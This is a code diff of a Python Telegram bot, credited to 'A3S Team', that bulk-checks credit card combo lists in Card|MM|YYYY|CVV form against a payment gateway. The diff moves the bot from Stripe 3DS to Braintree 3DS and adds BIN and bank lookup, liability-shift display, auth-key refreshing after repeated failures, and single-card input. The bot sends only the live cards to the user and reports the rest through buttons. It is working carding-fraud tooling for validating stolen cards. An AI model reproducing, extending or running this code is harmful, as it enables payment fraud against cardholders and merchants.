-━━━━━━━━━━━━━━━━━━━━
-Please wait...
-</b>"""
-            )
-            
-            print(f"{YELLOW}⏸ Waiting {wait_minutes} minutes due to N/A errors...{RESET}")
-            time.sleep(checker.wait_time)
-            
-            # تجديد الجلسة بالكامل
-            print(f"{YELLOW}🔄 Refreshing session after N/A wait...{RESET}")
-            checker.initialize_session()
-            checker.consecutive_na_count = 0
-            
-            # مضاعفة وقت الانتظار للمرة القادمة
-            checker.wait_time = min(checker.wait_time * 2, checker.max_wait_time)
-            
-            bot.send_message(
-                user_id,
-                f"""<b>✅ Resuming Checks
-━━━━━━━━━━━━━━━━━━━━
-🔄 Session refreshed
-⚡ Continuing from card #{checked + 1}
-</b>"""
-            )
-        
         checked += 1
         result = checker.check_card(card)
         
-        # إنشاء الكيبورد
+        # إنشاء زر لعرض نتيجة الفحص مع الـ status_3ds مباشرة
         keyboard = types.InlineKeyboardMarkup(row_width=1)
-        status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
-        check_num = result.get('details', {}).get('check_number', checked)
-        session_num = result.get('details', {}).get('session_number', 1)
+        status_3ds = result.get('details', {}).get('status_3ds', 'Unknown')
         callback_data = f"show_result_{checked}"
-        
         keyboard.add(
-            types.InlineKeyboardButton(f"📋 Status: {status_3ds} | Check: #{check_num} | Session: #{session_num}", callback_data=callback_data)
+            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
         )
         keyboard.add(
             types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Approved ✓ ➜ [{approved}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• N/A ⚠️ ➜ [{na_count}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• Errors ❌ ➜ [{errors}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
             types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
         )
@@ -655,23 +430,54 @@ Please wait...
 💳 Card: <code>{card['raw']}</code>
 📊 Response: {result['message']}
 ⏱ Time: {result['time']} sec
-🔐 3DS Status: {details['status_3ds']}
-🔢 Check #: {details.get('check_number', checked)}
-🔄 Session #: {details.get('session_number', 1)}
+
+🏦 BIN Info:
+├ BIN: <code>{details['bin']}</code>
+├ Type: {details['type']}
+├ Bank: {details['bank']}
+└ Country: {details['country']} {details['emoji']}
+
+🔒 3DS Info:
+├ Status: {details['status_3ds']}
+├ Liability: {'✅ Shifted' if details['liability'] else '❌ Not Shifted'}
+└ Enrolled: {details['enrolled']}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
             bot.send_message(user_id, msg)
+            failed_count = 0
+        elif result['status'] == 'APPROVED':
+            approved += 1
+            failed_count = 0
         elif result['status'] == 'OTP':
             otp += 1
+            failed_count = 0
         elif result['status'] == 'DECLINED':
             declined += 1
-        elif result['status'] == 'NA':
-            na_count += 1
+            failed_count = 0
         else:
             errors += 1
+            failed_count += 1
+            if result['message'] == 'Lookup Error':
+                checking_status[user_id] = False
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=message.message_id,
+                    text=f"""<b>⚠️ Lookup Error Detected!
+━━━━━━━━━━━━━━━━━━━━
+⏳ Checking stopped due to Lookup Error.
+📝 Please try again after 15 minutes.
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+                )
+                return
+            if failed_count >= 5:
+                bot.send_message(user_id, "⚠️ Refreshing keys...")
+                if checker.get_auth_keys():
+                    failed_count = 0
         
-        # تخزين النتيجة
+        # تخزين نتيجة الكرت لعرضها عند الضغط على الزر
         user_cards[user_id][checked-1]['result'] = result
         
         progress = int((checked / total) * 20)
@@ -680,29 +486,17 @@ Please wait...
         speed = checked / elapsed if elapsed > 0 else 0
         eta = (total - checked) / speed if speed > 0 else 0
         
-        next_refresh = 10 - (checked % 10) if checked % 10 != 0 else 10
-        
-        status_text = f"""<b>🔥 Gateway: Stripe 3DS
+        try:
+            bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=message.message_id,
+                text=f"""<b>🔥 Gateway: Braintree 3DS
 ━━━━━━━━━━━━━━━━━━━━
 ⏳ Checking in progress...
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
-🔢 Check: {checked}/{total}
-🔄 Session #: {checker.session_refresh_count}
-⏭️ Next Session Refresh: {next_refresh} checks"""
-        
-        # إضافة تحذير N/A إذا كان هناك
-        if checker.consecutive_na_count > 0:
-            status_text += f"\n⚠️ Consecutive N/A: {checker.consecutive_na_count}/5"
-        
-        status_text += "\n</b>"
-        
-        try:
-            bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=message.message_id,
-                text=status_text,
+</b>""",
                 reply_markup=keyboard
             )
         except:
@@ -711,11 +505,6 @@ Please wait...
         time.sleep(0.5)
     
     # النتيجة النهائية
-    if should_stop:
-        checking_status[user_id] = False
-        del user_cards[user_id]
-        return
-    
     total_time = time.time() - start_time
     bot.edit_message_text(
         chat_id=message.chat.id,
@@ -725,15 +514,14 @@ Please wait...
 📊 Results Summary:
 ├ Total Cards: {total}
 ├ LIVE ✅: {live}
+├ Approved ✓: {approved}
 ├ OTP 🔐: {otp}
 ├ Declined ❌: {declined}
-├ N/A ⚠️: {na_count}
-├ Errors ❌: {errors}
+├ Errors ⚠️: {errors}
 
 ⏱ Stats:
 ├ Time: {int(total_time)}s
-├ Speed: {(total/total_time):.2f} cards/sec
-└ Total Sessions: {checker.session_refresh_count}
+└ Speed: {(total/total_time):.2f} cards/sec
 ━━━━━━━━━━━━━━━━━━━━
 🎉 Thank you for using the bot!
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
@@ -756,14 +544,24 @@ def show_card_result(call):
     result = card.get('result', {})
     details = result.get('details', {})
     
-    msg = f"""<b>{result.get('message', '❓ Unknown Status')}
+    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
 ━━━━━━━━━━━━━━━━━━━━
 💳 Card: <code>{card['raw']}</code>
 📊 Response: {result.get('message', 'Unknown')}
-⏱ Time: {result.get('time', 0)} sec
-🔐 3DS Status: {details.get('status_3ds', 'N/A')}
-🔢 Check Number: #{details.get('check_number', 'N/A')}
-🔄 Session Number: #{details.get('session_number', 'N/A')}
+⏱ Time: {result.get('time', 0)} sec"""
+    
+    if details:
+        msg += f"""
+🏦 BIN Info:
+├ BIN: <code>{details.get('bin', 'N/A')}</code>
+├ Type: {details.get('type', 'Unknown')}
+├ Bank: {details.get('bank', 'Unknown Bank')}
+└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}
+
+🔒 3DS Info:
+├ Status: {details.get('status_3ds', 'N/A')}
+├ Liability: {'✅ Shifted' if details.get('liability', False) else '❌ Not Shifted'}
+└ Enrolled: {details.get('enrolled', 'U')}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -790,7 +588,7 @@ def help_message(message):
 /status - Check bot status
 
 📤 How to use:
-1. Send a combo file (.txt) or card details
+1. Send a combo file (.txt)
 2. Click "Start Checking"
 3. Only LIVE cards sent, others via button
 
@@ -798,14 +596,7 @@ def help_message(message):
 Card|MM|YYYY|CVV
 
 Example:
-5127740082586858|11|2028|155
-
-🔄 Features:
-• Fresh client_secret for EVERY card check
-• Auto session refresh every 10 checks
-• Real-time progress tracking
-• Secure & fast processing
-• No more N/A errors!
+5127740080852575|03|2027|825
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -815,25 +606,50 @@ Example:
 def status_message(message):
     status_text = """<b>🟢 Bot Status: ONLINE
 ━━━━━━━━━━━━━━━━━━━━
-⚡ Gateway: Stripe 3DS
+⚡ Gateway: Braintree 3DS
 🔥 Speed: Ultra Fast
 ✅ Accuracy: High
-🔄 Fresh Keys: Every Check
-🔄 Session Refresh: Every 10 Checks
-🌐 Server: Active
+🌍 Server: Active
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
     bot.send_message(message.chat.id, status_text)
 
+@bot.message_handler(func=lambda message: True)
+def handle_text(message):
+    text = message.text.strip()
+    if '|' in text and len(text.split('|')) == 4:
+        parts = text.split('|')
+        user_cards[message.from_user.id] = [{
+            'number': parts[0].strip(),
+            'month': parts[1].strip().zfill(2),
+            'year': parts[2].strip(),
+            'cvv': parts[3].strip(),
+            'raw': text
+        }]
+        checking_status[message.from_user.id] = False
+        
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
+        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
+        
+        bot.send_message(
+            chat_id=message.chat.id,
+            text=f"""<b>✅ Card Loaded!
+━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
+🔥 Gateway: Braintree 3DS
+⚡ Status: Ready
+</b>""",
+            reply_markup=keyboard
+        )
+    else:
+        bot.reply_to(message, """<b>❌ Invalid format!
+Use: Card|MM|YYYY|CVV
+Example: 5127740080852575|03|2027|825
+</b>""")
+
 if __name__ == "__main__":
-    print("=" * 50)
-    print("🚀 Starting Stripe Checker Bot...")
-    print("=" * 50)
+    print("🚀 Starting Braintree Checker Bot...")
     print(f"👤 Admin ID: {ADMIN_ID}")
-    print(f"🔑 Fresh Keys: Every Check")
-    print(f"🔄 Session Refresh: Every 10 Checks")
-    print(f"✅ Bot is running...")
-    print("=" * 50)
-    print()
+    print("✅ Bot is running...\n")
     bot.polling(none_stop=True)
